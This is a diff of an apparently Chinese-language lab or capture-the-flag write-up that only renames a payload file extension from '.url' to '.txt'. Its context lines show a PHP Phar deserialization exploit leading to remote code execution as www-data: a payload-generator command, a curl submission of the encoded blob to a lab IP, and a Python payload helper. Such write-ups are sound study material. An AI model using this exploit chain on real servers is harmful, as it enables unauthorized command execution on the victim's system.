@@ -392,7 +392,7 @@ file_put_contents($out . '.url', rawurlencode($data));
 php -d phar.readonly=0 make_phar_payload.php system id poc.bin
 ```
 ![](file-20260606123033226.png)
-生成出来的 `poc.bin.url` 是 URL 编码后的 Phar 二进制，拿它去提交。
+生成出来的 `poc.bin.txt` 是 URL 编码后的 Phar 二进制，拿它去提交。
 
 # 直接 getshell（www-data RCE）
 
@@ -412,7 +412,7 @@ arg   = id
 
 ```bash
 curl -c cookie.txt -b cookie.txt \
-  --data-urlencode 'blob@poc.bin.url' \
+  --data-urlencode 'blob@poc.bin.txt' \
   'http://192.168.56.109/?c=Task&m=submit'
 ```
 
@@ -499,7 +499,7 @@ def make_payload(cmd):
         check=True,
         stdout=subprocess.DEVNULL,
     )
-    with open(OUT + ".url", "r", encoding="ascii") as f:
+    with open(OUT + ".txt", "r", encoding="ascii") as f:
         return f.read()
 
 def run_cmd(cmd):
